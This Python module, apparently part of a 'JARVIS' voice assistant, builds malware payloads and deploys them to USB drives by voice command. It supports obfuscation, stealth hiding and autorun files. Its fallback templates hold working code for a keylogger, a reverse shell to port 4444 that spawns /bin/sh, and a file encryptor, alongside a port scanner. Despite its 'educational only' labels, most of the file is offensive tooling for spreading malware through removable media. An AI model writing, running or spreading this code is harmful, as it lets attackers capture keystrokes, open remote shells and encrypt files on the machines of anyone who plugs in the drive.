"""
USB Deployment Integration with JARVIS
"""
import os
from cybersecurity.usb_deployment import USBDeployment
from cybersecurity.enhanced_usb import EnhancedUSBDeployment
from cybersecurity.enhanced_malware import EnhancedMalwareLab
from typing import Optional, Dict


class USBIntegration:
    """Integration of USB deployment with malware lab"""
    
    def __init__(self):
        self.usb_deployer = USBDeployment()
        self.enhanced_deployer = EnhancedUSBDeployment()
        self.malware_lab = EnhancedMalwareLab(isolated_mode=True)
    
    def create_and_deploy_payload(self, payload_type: str, usb_drive: str,
                                  create_autorun: bool = False) -> Dict:
        """Create payload and deploy to USB in one step"""
        # Create payload (using enhanced malware lab)
        try:
            payload = self.malware_lab.create_obfuscated_payload(payload_type, "none")
        except:
            # Fallback: create basic payload
            payload = self._create_basic_payload(payload_type)
        
        if not payload or "file" not in payload:
            return {"error": "Failed to create payload"}
        
        payload_path = payload["file"]
        
        # Deploy to USB
        result = self.usb_deployer.deploy_payload_to_usb(
            payload_path,
            usb_drive,
            create_autorun=create_autorun
        )
        
        if result.get("success"):
            result["payload_type"] = payload_type
            result["payload_info"] = payload
        
        return result
    
    def deploy_existing_payload(self, payload_path: str, usb_drive: str,
                               create_autorun: bool = False) -> Dict:
        """Deploy an existing payload to USB"""
        return self.usb_deployer.deploy_payload_to_usb(
            payload_path,
            usb_drive,
            create_autorun=create_autorun
        )
    
    def create_usb_ready_package(self, payload_type: str, output_dir: str) -> Dict:
        """Create a complete USB-ready package"""
        # Create payload
        payload = self.malware_lab.create_educational_payload(payload_type)
        
        if "error" in payload or "file" not in payload:
            return {"error": "Failed to create payload"}
        
        # Create package
        package = self.usb_deployer.create_usb_package(
            payload["file"],
            output_dir,
            include_readme=True
        )
        
        if package.get("success"):
            package["payload_type"] = payload_type
            package["payload_info"] = payload
        
        return package
    
    def handle_voice_command(self, command: str) -> str:
        """Handle voice commands for USB deployment"""
        command_lower = command.lower()
        
        # Detect USB drives
        if "detect usb" in command_lower or "find usb" in command_lower:
            # Use enhanced detection
            drives = self.enhanced_deployer.detect_usb_drives_advanced()
            if not drives:
                drives = self.usb_deployer.detect_usb_drives()
            
            if drives:
                drive_info = []
                for d in drives:
                    info = f"{d['drive']} ({d['name']})"
                    if 'free_gb' in d:
                        info += f" - {d['free_gb']:.1f}GB free"
                    drive_info.append(info)
                return f"Found {len(drives)} USB drive(s): {', '.join(drive_info)}"
            else:
                return "No USB drives detected. Please insert a USB drive."
        
        # Deploy payload
        if "deploy" in command_lower or "put on usb" in command_lower:
            # Extract payload type
            payload_type = None
            if "keylogger" in command_lower:
                payload_type = "keylogger"
            elif "reverse shell" in command_lower or "backdoor" in command_lower:
                payload_type = "reverse_shell"
            elif "encrypt" in command_lower:
                payload_type = "file_encryptor"
            elif "scanner" in command_lower:
                payload_type = "network_scanner"
            
            if not payload_type:
                return "Specify payload type: keylogger, reverse_shell, file_encryptor, or network_scanner"
            
            # Extract USB drive
            drives = self.usb_deployer.detect_usb_drives()
            if not drives:
                return "No USB drives detected. Insert a USB drive first."
            
            # Use first detected drive
            usb_drive = drives[0]["drive"] if self.usb_deployer.system == "Windows" else drives[0]["path"]
            
            # Check for autorun and advanced options
            create_autorun = "autorun" in command_lower or "auto" in command_lower
            hide_method = "stealth" in command_lower and "stealth" or "auto"
            use_enhanced = "advanced" in command_lower or "enhanced" in command_lower
            
            if use_enhanced:
                result = self._create_and_deploy_enhanced(payload_type, usb_drive, create_autorun, hide_method)
            else:
                result = self.create_and_deploy_payload(payload_type, usb_drive, create_autorun)
            
            if result.get("success"):
                response = f"Payload deployed to USB drive {usb_drive}. "
                response += f"File: {result.get('destination', 'unknown')}. "
                if result.get("autorun"):
                    response += "Autorun created. "
                response += result.get("warning", "")
                return response
            else:
                return f"Deployment failed: {result.get('error', 'Unknown error')}"
        
        # List USB contents
        if "list usb" in command_lower or "usb contents" in command_lower:
            drives = self.usb_deployer.detect_usb_drives()
            if not drives:
                return "No USB drives detected."
            
            usb_drive = drives[0]["drive"] if self.usb_deployer.system == "Windows" else drives[0]["path"]
            contents = self.usb_deployer.list_usb_contents(usb_drive)
            
            if contents:
                return f"USB contents: {', '.join(contents[:10])}"
            else:
                return "USB drive is empty."
        
        # Clean USB
        if "clean usb" in command_lower or "remove from usb" in command_lower:
            drives = self.usb_deployer.detect_usb_drives()
            if not drives:
                return "No USB drives detected."
            
            usb_drive = drives[0]["drive"] if self.usb_deployer.system == "Windows" else drives[0]["path"]
            
            # Use intelligent cleanup if available
            use_intelligent = "intelligent" in command_lower or "smart" in command_lower
            if use_intelligent:
                result = self.enhanced_deployer.intelligent_cleanup(usb_drive)
            else:
                result = self.usb_deployer.clean_usb(usb_drive)
            
            if result.get("success"):
                removed = result.get('removed', [])
                count = result.get('count', len(removed))
                return f"Cleaned USB drive. Removed {count} file(s)."
            else:
                return f"Cleanup failed: {result.get('error', 'Unknown error')}"
        
        # Create rich package
        if "create package" in command_lower or "usb package" in command_lower:
            # Extract payload type
            payload_type = None
            if "keylogger" in command_lower:
                payload_type = "keylogger"
            elif "reverse shell" in command_lower:
                payload_type = "reverse_shell"
            elif "encrypt" in command_lower:
                payload_type = "file_encryptor"
            elif "scanner" in command_lower:
                payload_type = "network_scanner"
            
            if not payload_type:
                return "Specify payload type for package creation."
            
            # Create payload
            try:
                payload = self.malware_lab.create_obfuscated_payload(payload_type, "none")
            except:
                payload = self._create_basic_payload(payload_type)
            
            if not payload or "file" not in payload:
                return "Failed to create payload."
            
            # Create package
            package = self.enhanced_deployer.create_rich_package(
                payload["file"],
                "./usb_packages",
                {
                    "package_name": f"{payload_type}_package",
                    "include_autorun": True,
                    "include_installer": True,
                    "version": "1.0"
                }
            )
            
            if package.get("success"):
                return f"Package created in {package['package_dir']}. Files: {', '.join(package['files'])}"
            else:
                return "Package creation failed."
        
        return "USB commands: detect usb, deploy [payload] to usb, list usb, clean usb"
    
    def _create_and_deploy_enhanced(self, payload_type: str, usb_drive: str,
                                    create_autorun: bool, hide_method: str) -> Dict:
        """Create and deploy using enhanced methods"""
        # Create payload
        try:
            payload = self.malware_lab.create_obfuscated_payload(payload_type, "none")
        except:
            payload = self._create_basic_payload(payload_type)
        
        if not payload or "file" not in payload:
            return {"error": "Failed to create payload"}
        
        payload_path = payload["file"]
        
        # Deploy with enhanced hiding
        result = self.enhanced_deployer.deploy_with_advanced_hiding(
            payload_path,
            usb_drive,
            hide_method=hide_method
        )
        
        if result.get("success"):
            # Create advanced autorun if requested
            if create_autorun:
                usb_path = f"{usb_drive}:\\" if len(usb_drive) == 1 else usb_drive
                autorun_type = "stealth" if "stealth" in hide_method else "standard"
                autorun_result = self.enhanced_deployer.create_advanced_autorun(
                    usb_path,
                    os.path.basename(payload_path),
                    autorun_type
                )
                result["autorun"] = autorun_result
            
            # Save deployment log
            usb_path = f"{usb_drive}:\\" if len(usb_drive) == 1 else usb_drive
            self.enhanced_deployer.save_deployment_log(usb_path)
            
            result["payload_type"] = payload_type
            result["payload_info"] = payload
        
        return result
    
    def _create_basic_payload(self, payload_type: str) -> Dict:
        """Create basic payload if enhanced method fails"""
        import tempfile
        import os
        
        sandbox = tempfile.mkdtemp(prefix="usb_payload_")
        filepath = os.path.join(sandbox, f"{payload_type}.py")
        
        # Basic payload templates
        payloads = {
            "keylogger": '''import pynput
from pynput import keyboard
import logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(str(key))
    except:
        pass
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()''',
            "reverse_shell": '''import socket
import subprocess
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])''',
            "file_encryptor": '''from cryptography.fernet import Fernet
import os
key = Fernet.generate_key()
cipher = Fernet(key)
for file in os.listdir('.'):
    if file.endswith('.txt'):
        with open(file, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file + '.encrypted', 'wb') as f:
            f.write(encrypted)
print(f"Key: {key.decode()}")''',
            "network_scanner": '''import socket
target = "127.0.0.1"
ports = [22, 80, 443, 8080]
for port in ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    if result == 0:
        print(f"Port {port}: OPEN")
    sock.close()'''
        }
        
        if payload_type not in payloads:
            return {}
        
        with open(filepath, 'w') as f:
            f.write(payloads[payload_type])
        
        return {
            "file": filepath,
            "type": payload_type,
            "warning": "Educational only. Use in isolated VM."
        }
